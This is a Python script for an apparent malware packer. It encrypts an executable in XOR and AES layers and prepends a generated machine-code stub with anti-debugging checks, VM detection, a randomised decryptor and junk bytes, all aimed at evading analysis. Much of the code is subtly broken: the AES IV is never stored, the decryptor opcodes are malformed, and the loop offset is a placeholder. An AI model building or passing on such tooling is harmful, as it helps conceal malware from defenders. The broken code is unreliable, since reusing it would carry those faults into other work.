import os
import sys
import random
import struct
import hashlib
import ctypes
import zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Protocol.KDF import scrypt

class AdvancedCustomPacker:
    def __init__(self, key=None, anti_analysis=True):
        if key is None:
            key = os.urandom(64)  # 512-bit key
        self.key = key
        self.iv = os.urandom(16)
        self.magic = b"VMX\x90"  # Updated magic header
        self.anti_analysis = anti_analysis
        self.entropy = random.randint(0, 0xFFFFFFFF)
        
    def pack(self, input_file, output_file):
        with open(input_file, "rb") as f:
            plaintext = f.read()
        
        # Compress first
        compressed = zlib.compress(plaintext, level=9)
        
        # Encrypt with layered encryption
        layer1 = self.xor_encrypt(compressed, self.key[:32])
        layer2 = self.aes_encrypt(layer1, self.key[32:48])
        layer3 = self.xor_encrypt(layer2, self.key[48:])
        
        # Generate polymorphic stub
        stub = self.generate_polymorphic_stub()
        
        with open(output_file, "wb") as f:
            # Write header
            f.write(self.magic)
            f.write(struct.pack("<I", self.entropy))
            f.write(struct.pack("<I", len(stub)))
            f.write(struct.pack("<I", len(layer3)))
            
            # Write encrypted key (protected with entropy)
            encrypted_key = bytes([b ^ (self.entropy >> (8 * i) & 0xFF) 
                                 for i, b in enumerate(self.key)])
            f.write(encrypted_key)
            
            # Write stub
            f.write(stub)
            
            # Write encrypted data
            f.write(layer3)
            
            # Append hash for integrity check
            f.write(hashlib.sha512(layer3).digest())
    
    def generate_polymorphic_stub(self):
        stub = b""
        rng = random.Random(self.entropy)
        
        # Entry point with anti-debugging
        stub += b"\xE8\x00\x00\x00\x00"                   # CALL $+5
        stub += b"\x5B"                                   # POP EBX/RBX
        stub += b"\x48\x83\xEB\x05"                       # SUB EBX/RBX, 5
        
        # Anti-debugging checks
        if self.anti_analysis:
            stub += self.generate_anti_debug(rng)
        
        # Decryption routines
        stub += self.generate_decryptor(rng)
        
        # JMP to OEP (original entry point)
        stub += b"\xFF\xE0"                               # JMP RAX/EAX
        
        # Add junk instructions
        for _ in range(128):
            stub += bytes([rng.randint(0, 255) for _ in range(rng.randint(1, 8))])
        
        return stub
    
    def generate_anti_debug(self, rng):
        anti_debug = b""
        
        # IsDebuggerPresent check
        anti_debug += b"\x65\xA1\x30\x00\x00\x00"       # MOV EAX, DWORD PTR GS:[0x30]
        anti_debug += b"\x0F\xB6\x40\x02"               # MOVZX EAX, BYTE PTR [EAX+2]
        anti_debug += b"\x84\xC0"                       # TEST AL, AL
        anti_debug += b"\x75\x03"                       # JNZ $+5
        anti_debug += b"\xEB\xFE"                       # JMP $-2 (infinite loop)
        
        # Timing check (rdtsc)
        anti_debug += b"\x0F\x31"                       # RDTSC
        anti_debug += b"\x89\xC1"                       # MOV ECX, EAX
        anti_debug += b"\x90\x90\x90\x90"               # NOPs (timing)
        anti_debug += b"\x0F\x31"                       # RDTSC
        anti_debug += b"\x29\xC8"                       # SUB EAX, ECX
        anti_debug += b"\x3D\x00\x10\x00\x00"           # CMP EAX, 0x1000
        anti_debug += b"\x77\x03"                       # JA $+5
        anti_debug += b"\xEB\xFE"                       # JMP $-2
        
        # VM detection (CPUID)
        anti_debug += b"\x31\xC0"                       # XOR EAX, EAX
        anti_debug += b"\x40"                           # INC EAX
        anti_debug += b"\x0F\xA2"                       # CPUID
        anti_debug += b"\x0F\xBA\xE2\x1F"               # BT EDX, 31 (hypervisor bit)
        anti_debug += b"\x72\x03"                       # JC $+5
        anti_debug += b"\xEB\xFE"                       # JMP $-2
        
        return anti_debug
    
    def generate_decryptor(self, rng):
        decryptor = b""
        regs = ["EAX", "EBX", "ECX", "EDX", "ESI", "EDI"]
        key_reg = rng.choice(regs)
        data_reg = rng.choice(regs)
        size_reg = rng.choice(regs)
        counter_reg = rng.choice(regs)
        
        # Load key address
        decryptor += bytes.fromhex("8B9C24") + struct.pack("<I", 16 + rng.randint(0, 100))
        decryptor += bytes.fromhex(f"89{self.reg_code(key_reg)}")  # MOV key_reg, [ESP+offset]
        
        # Load data address
        decryptor += bytes.fromhex("8B9C24") + struct.pack("<I", 20 + rng.randint(0, 100))
        decryptor += bytes.fromhex(f"89{self.reg_code(data_reg)}")
        
        # Load size
        decryptor += bytes.fromhex("8B9C24") + struct.pack("<I", 24 + rng.randint(0, 100))
        decryptor += bytes.fromhex(f"89{self.reg_code(size_reg)}")
        
        # Initialize counter
        decryptor += bytes.fromhex(f"31{self.reg_code(counter_reg)}")  # XOR counter_reg, counter_reg
        
        # Decryption loop
        loop_label = b"\x90" * 5  # Placeholder
        decryptor += loop_label
        
        # Load byte
        decryptor += bytes.fromhex(f"8A04{self.reg_code(data_reg)}{self.reg_code(counter_reg)}")
        
        # XOR with key (rotating key)
        decryptor += bytes.fromhex(f"3204{self.reg_code(key_reg)}{self.reg_code(counter_reg)}")
        decryptor += b"\xD0\xC8"  # ROR AL, 1
        
        # Store byte
        decryptor += bytes.fromhex(f"8804{self.reg_code(data_reg)}{self.reg_code(counter_reg)}")
        
        # Increment counter
        decryptor += bytes.fromhex(f"41")  # INC counter_reg
        
        # Loop condition
        decryptor += bytes.fromhex(f"39{self.reg_code(size_reg)}{self.reg_code(counter_reg)}")
        decryptor += bytes.fromhex(f"75") + loop_label[0:1]  # JNZ loop
        
        return decryptor
    
    def reg_code(self, reg):
        codes = {"EAX": "C0", "EBX": "D8", "ECX": "C8", "EDX": "D0", 
                 "ESI": "F0", "EDI": "F8"}
        return codes.get(reg, "C0")
    
    def xor_encrypt(self, data, key):
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data))
    
    def aes_encrypt(self, data, key):
        cipher = AES.new(key, AES.MODE_CBC, self.iv)
        return cipher.encrypt(pad(data, AES.block_size))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: custom_packer.py <input> <output> [key]")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    key = None
    if len(sys.argv) >= 4:
        key = sys.argv[3].encode()
    
    packer = AdvancedCustomPacker(key)
    packer.pack(input_file, output_file)
    print(f"Packed {input_file} to {output_file}")